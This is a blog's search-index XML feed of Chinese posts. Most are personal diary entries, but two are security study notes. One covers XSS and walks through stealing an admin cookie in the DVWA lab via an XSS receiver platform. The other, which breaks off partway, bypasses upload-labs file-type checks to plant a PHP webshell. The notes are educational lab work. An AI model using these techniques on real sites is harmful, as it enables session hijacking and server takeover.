<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss学习笔记</title>
    <link href="/2022/03/05/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/05/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>xss，即跨站脚本攻击,实际上是<strong>在前端注入js编写的恶意代码。</strong>该漏洞产生的危害取决于js执行了怎样的脚本代码。当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。如果用户输入中某个参数的全部或其中一部分，原封不动地在源代码里出现时，我们就可以认为这个参数存在XSS漏洞。</p><span id="more"></span><hr><h3 id="xss的分类"><a href="#xss的分类" class="headerlink" title="xss的分类"></a>xss的分类</h3><p>xss被普遍分为以下三类：</p><ul><li><p>反射型xss</p><p>反射性又称非持久性xss,这种攻击方式往往具有一次性。</p><p>攻击方式：攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后目标服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss的恶意脚本后，就会触发xss漏洞。</p></li><li><p>储存型xss</p><p>储存型xss又称持久型xss,攻击脚本将被永久地存在目标服务器的数据库或文件中，具有很高的隐蔽性。</p></li></ul><p>​        攻击方式：这种攻击多见于论坛、博客和留言版，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注        入帖子的内容中。随着帖子被服务器储存下来，恶意脚本也永久地被存放在服务器的后端储存器中。当其他        用户浏览这个被注入恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。如攻击者在留言板中加入        以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;script&gt; alert(/hacker/)&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>​        当其他用户访问留言版时，就会看到一个弹窗。储存型xss的攻击方式能够将恶意代码永久地嵌入一个页中，        所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型xss攻击将没有多大        作为，而储存型xss则不同，由于它注入在一些我们信任的页面，因此无论我们多么小心，都难免会受到击。</p><ul><li><p>DOM型xss</p><p>DOM全称Document Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。DOM型xss其实是一种特殊类型的反射型xss，它是基于DOM文档对象模型的一种漏洞。</p><p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点数。通过HTML DOM，书中的所有节点均可通过JavaScript进行访问。所有HTML元素（节点）均可被修改，也可以创建或删除节点。HTML DOM 数结构如下图所示：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/ct_htmltree.gif"></p></li></ul><p>​        在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面内创建一个顶级的Document object文档        对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。        可以通过js脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动        态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于        DOM型的xss漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p><p>​        攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会        以任何形式包含攻击者的脚本。当用用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致触发        xss漏洞。</p><hr><h3 id="xss产生的原理（代码层面）"><a href="#xss产生的原理（代码层面）" class="headerlink" title="xss产生的原理（代码层面）"></a>xss产生的原理（代码层面）</h3><p><strong>反射型xss</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>       if(isset($_GET[&#x27;str&#x27;]))<br>       &#123;<br>echo &#x27;&lt;input type=&quot;text&quot; value=&quot;&#x27;.$_GET[&#x27;str&#x27;].&#x27;&quot;&gt;&#x27;;            <br>       &#125;<br>?&gt;<br></code></pre></div></td></tr></table></figure><p>当我们在输入框中输入字符串时，即<code>&#39;str&#39;=abc</code>，代码正常运作；但当我们输入构造的JavaScript代码时，即访问xx/xx.php?str=<code>&quot;&gt;&lt;img src=1 onerror=alert(/xss/) /&gt;</code>，此时<code>echo</code>语句输出的是</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;input type=&quot;text&quot; value=&quot;&quot;&gt; &lt;img src=1 onerror=alert(/xss/) /&gt; &quot;&gt;<br>//即闭合了前面的标签，并导致输入的&lt;img src=1 onerror=alert(/xss/) /&gt;变成了HTML的标签<br></code></pre></div></td></tr></table></figure><p>所以当浏览器访问这个页面时，输出到页面的HTML代码变为了<code>&lt;img src=1 onerror=alert(/xss/) /&gt;</code>。此行代码的作用： img读取错误，引发了onerror从而执行alert函数，显示”xss“的弹窗 。（onerror，当视频的媒体数据加载期间发生错误时执行JavaScript代码）</p><hr><p><strong>储存型xss</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;)<br>    //连接数据库<br>    $result1=mysqli_query($con,&quot;insert into table(&#x27;title&#x27;,&#x27;content&#x27;) VALUES (&#x27;&quot;.$_POST[&#x27;tittle&#x27;].&quot;&#x27;,&#x27;&quot;.$_POST[&#x27;content&#x27;].&quot;&#x27;)&quot;);<br>//将用户输入插入到数据库中<br>    $result2=mysqli_query($con,&quot;select * from table&quot;);<br>//读取数据库数据<br>    $row=mysqli_fetch_array($result2);<br>//将读取到的数据转为数组形式准备输出<br>echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&#x27;title&#x27;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#x27;comtent&#x27;].&quot;&lt;/td&gt;&quot;;<br>//将读取到的数据库内容输出<br>?&gt;<br><br></code></pre></div></td></tr></table></figure><p>这里的<code>$_POST[&#39;title&#39;]</code>和 <code>$_POST[&#39;comtent&#39;]</code> 都是注入点。拿<code>&#39;title&#39;</code>来举例，当用户在标题处写入<code>&lt;img src=1 onerror=alter(/xss/)/&gt;</code>,在数据库存入的即为</p><table><thead><tr><th>id</th><th>title</th><th>content</th></tr></thead><tbody><tr><td>1</td><td>&lt;img src=1 onerror=alter(/xss/)/&gt;</td><td>xxx</td></tr></tbody></table><p>而当title输出到页面时，页面执行了<code>&lt;img src=1 onerror=alter(/xss/)/&gt;</code>,导致弹窗。</p><hr><p><strong>DOM型xss攻击</strong></p><p>DMO型xss程序只有HTML代码，并不存在服务器端代码，所以此程序并没有与服务器端交互。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    fuction <span class="hljs-function"><span class="hljs-title">myfuction</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">     <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;id1&quot;</span>).innerHTML=</span><br><span class="javascript"><span class="hljs-built_in">document</span>.getElementBtId(<span class="hljs-string">&quot;dom_input&quot;</span>).value;</span><br><span class="javascript">    &#125;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dom_input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;输入&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;替换&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;myfuction()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>单机“替换”按钮时会执行JavaScript的myfunction()函数，而myfunction()函数是一个DOM操作，通过document.getElementById获取ID为id1的节点，然后将节点id1的内容修改为dom_input中的值，即用户输入的值。当输入<code>&lt;img src=1 onerror=alter(/xss/)/&gt;</code>时，单击”替换“按钮，我们输入的数据又会输出到页面上，所以页面弹出消息框。但由于是隐式输出的，所以在查看源代码时，看不到输出的xss代码</p><hr><h3 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a>xss的危害</h3><p><em>常规用到的是盗取cookie、js做钓鱼攻击、流量指向等。主要是盗取管理员的会话和cookie信息，就是我们常说的管理员凭证，就意味着得到后台权限，可以直接利用。还能配合别的漏洞，比如可以和网页木马结合，扔到那里去跳转到网马地址，网马地址被执行后续就控制一些权限。</em></p><p>下面以dvwa的low级别反射型xss来演示,如何利用xss漏洞产生渗透效果</p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br><br>header (&quot;X-XSS-Protection: 0&quot;);<br><br>// Is there any input?<br>if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;<br>    // Feedback for end user<br>    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;<br>&#125;<br><br>?&gt; <br></code></pre></div></td></tr></table></figure><p>我们输入的参数原封不动地输出到页面，存在反射型xss。</p><p><strong>以盗取cookie为例</strong></p><p>思路：利用xss漏洞，构造payload。当用户访问链接，即点击我们的payload时，触发读取cookie的js代码。</p><p>即重点一是js怎么写，重点二是payload怎么写。</p><p>解决方法：这个js代码不再像之前的<code>alert()</code>直接写在payload里触发，而是写进一个js文件，储存在我们的服务器中。而我们构造的payload的功能即是使用户访问这个js文件。也就是说，当用户点击我们构造的链接，会访问我们服务器上某个页面的js代码，即触发我们设计好的js代码（这个过程可以伪装，即在用户的角度上，可能只是点了一下链接却没有反应或是跳转到了一个其它垃圾页面），从而使我们读取到用户的cookie。</p><p>（这只是一种主流的方法，不一定是唯一的方法，怎么利用取决于JavaScript能执行怎样的功能）</p><p>即我们还需要搭建一个网站来使用户访问，并在这个网站上布置js代码。这导致了xss的渗透不仅在本地环境复现比较复杂，而且在实际环境下还需要一定的成本，学习比较繁琐。针对这一情况，网上已经有了公共的xss平台， 也就是说我们构造的payload要使用户访问这个xss平台，并且平台也能提供了一些js模板来使用，通过这个平台我们也能更好地利用xss漏洞。如果只是本地复现的话，自己搭建平台也可以。在这里我搭建的是BlueLotus_XSSReceiver。</p><p>下面展示在本地环境下利用BlueLotus_XSSReceiver来盗取用户cookie。</p><p><strong>利用BlueLotus_XSSReceiver平台的详细步骤</strong></p><p>先生成一个js模板，这里我选的模板是default.js，官方介绍说这个模板包能完成xss的基本攻击</p><p>选好模块后设置好参数</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220306233110.png"></p><p>我的xss平台搭建在本地虚拟环境中，主机作为用户，所以需要分别把js文件和payload中的IP地址改为xss平台所在主机中的内网ip地址（注意js文件中的接收页面是ip/BlueLotus_XSSReceiver/index.php），使用户（即主机）能够访问到。</p><p>构造payload，诱使用户点击。我们这里即把平台生成的payload提交的xss漏洞处即可。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307184800.png"></p><p>此时我们平台的接收面版已经有了信息</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307184858.png"></p><p>复制盗取来的cookie值</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307194408.png"></p><p>当我们访问对应网站时，可以用浏览器插件或按f12进入开发者页面修改cookie值。修改完毕后访问网站，注意直接访问内部的页面，访问登录页面是没用的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307195024.png"></p><p>可以看到我们没有输入账号密码，直接用admin账户登录成功</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307200723.png"></p><p>如要实现其它功能，如屏幕截图、读取键盘输入，使用平台提供的对应js模板或自己修改js文件即可。</p><hr><h3 id="xss的实战"><a href="#xss的实战" class="headerlink" title="xss的实战"></a>xss的实战</h3><p>（其实也就是靶场..）</p><p>参考：<a href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p><p>​            《web安全攻防》</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从《1367》到《老人与海》</title>
    <link href="/2022/03/04/%E4%BB%8E%E3%80%8A1367%E3%80%8B%E5%88%B0%E3%80%8A%E8%80%81%E4%BA%BA%E4%B8%8E%E6%B5%B7%E3%80%8B/"/>
    <url>/2022/03/04/%E4%BB%8E%E3%80%8A1367%E3%80%8B%E5%88%B0%E3%80%8A%E8%80%81%E4%BA%BA%E4%B8%8E%E6%B5%B7%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<p>前两天，我参加了一个与陌生人交换书的活动。</p><span id="more"></span><hr><p>规则大致就是你寄书给朋友的朋友，然后自己另一个朋友的朋友寄书给你，相当于陌生人之间的交换。</p><p>起初我并不对自己能收到书抱有期望，只是我刚好手边有本快读完的《1367》。虽然我真的很想留住这本书，但我想，把这本书分享出去的意义会更大。于是我就参加了这个活动。</p><p>最初我要买这本书时，只是因为该书的推荐语是“国产推理的巅峰”，没想到拿到书时就被吓了一跳，当时还发了条qq动态。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220304220702.png"></p><p>竟然是港版的，与大陆书的主要区别就是繁体字，竖行，左开本。</p><p><strong>既然都是“国产推理的天花板了”，为什么大陆不出版？</strong>除了倍感新鲜外，也大致猜到了书里内容不简单。</p><p>书中前几章都是常规的本格推理模式，采用倒序的方式讲述了从2013-1967在香港发生的几桩案件，作者的确构思巧妙，诡计别出心裁，揭秘谜底时让我十分震撼。但最让我深思的，还是最后一章的故事，我猜主要也是因为这部分导致该书不能在大陆出版。</p><p>最后一章讲述的是“67暴动”。左派罢工，并采取激烈的斗争，放置炸弹来对抗香港政府。左派人员，香港皇家警察，无辜市民，三方伤亡惨重。甚至书中最残酷的一起事件也是历史上曾真实发生的写照。</p><p>在书中，我是大陆人自然先站在了左派人员的角度思考，所记叙的事让我觉得扭曲而虚幻，可这些都是血泪的历史。而惨剧发生，事件落幕后，书中一个角色的这句话，<strong>“你要保护的，到底是员警的招牌？还是市民的安全？你效忠的是港英政权，还是香港市民？你，为什么要当警察？”</strong>，也住了噎书里的警察主角。</p><p>当我看到有人讨论此书时，果然看到了一种评论，一种在中国大陆普遍存在的态度：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_223253.jpg"></p><p>但是紧接着，我也看到了另一种评论，一种我认为更值得可取的态度：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_223434.jpg"></p><p>“六七事件”在百度也能查到较为详细且客观的叙述，我相信我们，同香港市民总有一天能直面这段历史，理性分析，从中吸取教训。</p><p>致敬如今像书中那般，公正无私，保护市民的警察同志，也愿两岸人民消除偏见与隔阂，和睦相处，团结一致。</p><p>上面就是我为什么要寄书的故事了。虽然我重点写了书中有关社会方面的内容，但这本书本质还是一本十分优秀的本格推理小说。关于政治的部分作者也并没有夹带私货，反而理性客观。如果这篇文章有幸被您看到，希望您能读读这本佳作。您可以不去想那严肃沉重的历史，跟随作者的节奏，自然领略书中的情节就好了。</p><p>我寄书前，也跟收书的同学打了个电话。我只提到了港版书，希望他不要被繁体吓到。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_212623.jpg"></p><p>之后这位同学还发了个短信表示感谢，哈哈😊</p><p>关于这个活动收书的部分，果然是没有人鸟我。我还是主动找了一个平时看书的hxd争取一下。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_213426_com.tencent.mobileqq_e.jpg"></p><p>他要参加活动，寄皮皮鲁给别人，我觉得很有趣。而机缘之下，他朋友会寄给我一本书，我收到之后发现是英文版的《老人与海》。</p><p>好家伙我上次6级还就那个刚好没过，而且《老人与海》也是一个经典的故事。这个小时候曾读过的故事，我只记得当时因老人失败而产生的巨大落差。现在我其实知道或许不是失败，就像小时候被叫着去读《老人与海》一样，我现在被教育老人没有失败。</p><p><em>A man can be destroyed but not defeated</em></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/TOMADTS.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
      <tag>不敏感</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022</title>
    <link href="/2022/02/01/2022/"/>
    <url>/2022/02/01/2022/</url>
    
    <content type="html"><![CDATA[<p>2022年1月31日为除夕。我1月30日晚回老家，2月1日又回来。也许在路上的意义会比较重要因为在路上花的时间似乎都比我在老家呆的时间长。</p><span id="more"></span><hr><p>过年前一周我看完了马尔克斯的《霍乱时期的爱情》和《百年孤独》。看完之后我顺便了解了一下作者的生平，发现作者所写的那么多魔幻现实主义的情节，竟然有着来自于生活的原型，它们取材于自己和身边之人的故事。我也许应该在一个魔幻的地方再生活个二十来年，这样有助于我拿诺贝尔文学奖。至于魔幻的地方就选在中国好了。</p><p>​    中国有这么一点魔幻：在中国的正版单机手游必须要联网。因为国家出台的一系列限制未成年人玩游戏的规定，玩游戏需要实名认证并且游玩过程中需要保持联网，这些都是为了限制未成年人玩游戏。我本以为我会在我有小孩后再来感谢这个政策没想到在我20岁时却因这个政策忧国忧民：未成年人还是会玩游戏，并且他们还只能玩不受监管的盗版游戏。看来游戏厂商里面没有内部人员。回老家途中我为打发时间就想随便玩玩手游，又因为月末了没流量，我就蹭服务区wifi下了好几个单机手游（还有个买断付费的，后面也退款了），结果因为这个政策路上还是什么都玩不了，于是我就忧国忧民了一会儿。只是关于国民的部分就刚才提到那么一点剩下的是忧我自己不能玩游戏。</p><p>​    我可以蹭我爸的热点。但这让我不舒服，就像我不想要压岁钱一样。但就像我还是拿了压岁钱一样，我还是叫我爸帮我开了下热点。也像我不能年年一直要压岁钱一样，我也没有一直用我爸的热点。当然我只是没流量了又不是没电话费，可惜的是电话费以及我所有的生活费都来自于“压岁钱”和我爸的“热点”。我用热点看了好久的美剧《Fridends》来打发时间。下面是剧中我很喜欢的一段话，这段话是剧中Rachel剪断了她父亲给的信用卡后她的朋友Monica对Rachel说的。把它放在这里我觉得也蛮有意思。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Friends_Quotes_s01e01.jpg"></p><p>回老家一趟后我再看着这段话时不自禁想到外公，某些方面我和他还有些像。只是我也不想多想，也就不多写了。</p><p>上面就是我在路上发生的事了。</p><p>​    在老家发生的就事太多了，如果我再像前文一样啰里啰唆地写出来就把这段博客可以当作一本书出版算了。也许这本书会是诺贝尔文学奖的有力竞争者，前提是人们还喜欢魔幻现实主义。现在是凌晨零点51分，离我平时睡觉时间凌晨两点还有一段时间，但我想以后尽量零点睡觉好了。</p><p>​    </p><p>在老家的事就简单记下吧：</p><p>先去看了我”颠颠的”外婆</p><p>除夕夜我给我的好多朋友打了电话，就像之前我从没用过电话一样。然后我独自在那个简陋的小镇走了一段，边走边放手里的小烟花。</p><p>大年初一上坟，我如果写下我的感受的话我会认为我的感受十分不妥。</p><p>回来时我妈妈把我外公接回来了。</p><hr><p>好的弄完了睡觉。</p><hr><p>呜呜呜假期里好好学习，又玩完了半个假期。</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
      <tag>不敏感</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当伴郎</title>
    <link href="/2021/12/23/%E5%BD%93%E4%BC%B4%E9%83%8E/"/>
    <url>/2021/12/23/%E5%BD%93%E4%BC%B4%E9%83%8E/</url>
    
    <content type="html"><![CDATA[<p>今天我哥结婚，我回去一趟当伴郎</p><span id="more"></span><p>虽然我觉得我好好打理一下穿正装血🐎帅但我还是希望大家对我的印象保持在邋遢和随性所以就不放照片了并且我更喜欢侠隐于市的低调和潇洒😉<br>（当我为了见你而洗头时，希望你能感受到我对你极大的尊重）</p><p>当伴郎最大的感受就是婚礼是两个人的事，也是两个家庭的事，所以目前恋爱的小情侣好好珍惜现在纯粹的爱情吧😄<br>（不是说结了婚你们的爱情就不纯粹了吼）</p><p>两天在两座城市之间的穿梭让我觉得我是一个探险的旅人，是灵魂的躁动驱使我加快脚步<br>但是因为不在学校而错过了选课，现在已经没有课能选了。也罢，反正选修里面也没我喜欢的。我的肉体能忍受车马劳顿而我洗尽铅华的精神已容忍不了冰冷学分对我施加的束缚<br>（等下次选课的时候我应该又成为了俗人就不会在意这些了）</p><p>最后期末加油拒绝摆烂<br>（放假再摆）</p><hr><p>上面是我直接从我qq空间复制的哈哈哈，网上看着可能会觉得有些奇怪我也懒得改了..记录一下</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又有谁会一直挽留呢</title>
    <link href="/2021/11/09/%E5%8F%88%E6%9C%89%E8%B0%81%E4%BC%9A%E4%B8%80%E7%9B%B4%E6%8C%BD%E7%95%99%E5%91%A2/"/>
    <url>/2021/11/09/%E5%8F%88%E6%9C%89%E8%B0%81%E4%BC%9A%E4%B8%80%E7%9B%B4%E6%8C%BD%E7%95%99%E5%91%A2/</url>
    
    <content type="html"><![CDATA[<p>连机器人都不会。</p><span id="more"></span><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211109214520.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20201556.jpg"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211109213851.png"></p><p>（因为偶然点到一个搜索选项，小冰竟然会弹出这样的话，而之前我搜百度的时候记得还老是不让人去百度呢，hh）</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>恭喜edg</title>
    <link href="/2021/11/09/%E6%81%AD%E5%96%9Cedg/"/>
    <url>/2021/11/09/%E6%81%AD%E5%96%9Cedg/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>恭喜edg夺冠！（皇杂？真不熟😁），lpl好朋友可汗再次陪跑；meiko大满贯，成为当前lpl第一人；小学弟在edg呆了这么多年，从外援转成了本土，等他说获奖感言时，“为李哥报仇了，很开心”……一代电竞人圆满梦，猪狗大战也早已落下帷幕…</p><p>我虽然不是厂长的粉，但想起Clearlove7，想起年年八强，不得不佩服。</p><p>有件意思的事，那个周末我和一好朋友开黑，他说玩最后几把LOL就不玩了。我问他那你要做什么，他说要做大人该做的事了（他的原话）。最后几把游戏他玩了盖伦，说这是第一个带给他快乐的英雄，玩了杰斯和青钢影，他玩的最多的两个英雄，他想这应该是完美谢幕了吧。那我想我就玩ez吧，主要和我一样帅，完美谢幕嘛。他把游戏卸了，我也是。<br>我还找得到第一次玩英雄联盟的那种感觉吗。时至今日仍记得，我第一个人头是用的死歌拿的，此后任何有关LOL的记忆，于此相比都黯淡不少。</p><p>有句话说得好，你无法同时拥有青春和对青春的感悟。现在几日过去了，残余着些许激动，又怅然若失。只庆幸我还有青春。</p><p>而为梦想拼搏的故事，怎么讲都精彩。</p><p>我现在睡觉都不把手机带上床了，冲。（还不是因为课上摆烂太久了…今年的破防周来的晚一些吧😫）</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload labs通关历程（1~21关）</title>
    <link href="/2021/10/27/upload%20labs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B/"/>
    <url>/2021/10/27/upload%20labs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p> upload-labs,一个专门用于训练文件上传漏洞的靶场。上传漏洞，就是攻击者可上传一个可执行文件，如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p><span id="more"></span><p>这篇文章记录了我通关这个靶场的历程。</p><p><del>上次说记录通关历程的sqlilabs我好像就停在了20关🤔</del></p><hr><p>从第一关，开冲！</p><h3 id="1–格式检查之客户端js"><a href="#1–格式检查之客户端js" class="headerlink" title="1–格式检查之客户端js"></a>1–格式检查之客户端js</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027231935.png"></p><p>很常见的界面，首先直接传入一个写入一句话木马的<code>php</code>文件试试。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027232317.png"></p><p>在点击上传后的一瞬间弹出了一个JavaScript的alter，告诉我们限制了文件的类型不能为<code>php</code>。这关的限制很有可能就在前端，上传时没有与服务器交互就直接拒绝了我。可以尝试把木马的<code>php</code>后缀改为<code>jpg</code>，上传<code>jpg</code>文件然后用burp抓包，修改数据再把包发出去。即将下图中的“a.jpg”改为“a.php”。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027232640.png"></p><p>接着用蚁剑连接即可。</p><p>文件路径在上传文件后右键图片即可复制获得。</p><p>另外大致可以猜测<strong>这关上传文件的限制代码并没有进行HTTP请求去访问服务器<br> 所以可判断这是前端js验证，验证代码在我们的浏览器上</strong></p><p>我们也可以直接禁用浏览器的JavaScript或删除部分相关的js代码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233354.png"></p><p>然后直接上传“a.<code>php</code>”，显示上传成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233447.png"></p><p>（这一关的提示）</p><p>所以针对有前端限制的代码，可以用burp修改数据包绕过前端的限制，也可以直接通过浏览器禁用前端相关的限制代码。</p><h3 id="2–格式检查之mime-type"><a href="#2–格式检查之mime-type" class="headerlink" title="2–格式检查之mime-type"></a>2–格式检查之mime-type</h3><p>这关同样可以采取修改第一关的方法，上传后缀为jpg的木马文件，burp抓包后再修改回<code>php</code>，即可实现上传。</p><p>但不同的是这次不是通过前端JavaScript代码限制，而是在服务器端对数据包进行了MIME检测。</p><p><em>MIME是一种标准，用来表示文档、文件或字节流的性质和格式</em></p><p>不同类型的文件类型在传输时，有着不同的mime类型，这样浏览器就知道该用什么方式来打开它，和文件后缀的作用一致，只不过文件后缀是让操作系统知道这是什么类型文件，MIME是让信息的接收方知道这是什么类型的文件。</p><p>MIME在数据包中体现在了这一部分：content-type</p><p>如<code>jpg</code>类型的文件在content-type这一栏是image/jpeg</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028163015.png"></p><p>而<code>php</code>类型的文件在这一栏是application/octet-stream</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028162641.png"></p><p>所以除了刚才修改文件后缀的方法，我们也可以通过修改content-type这一属性来实现文件上传。直接上传<code>php</code>文件，然后再把数据包中content-type改为jpg的对应形式，即image/jpeg。</p><p><img 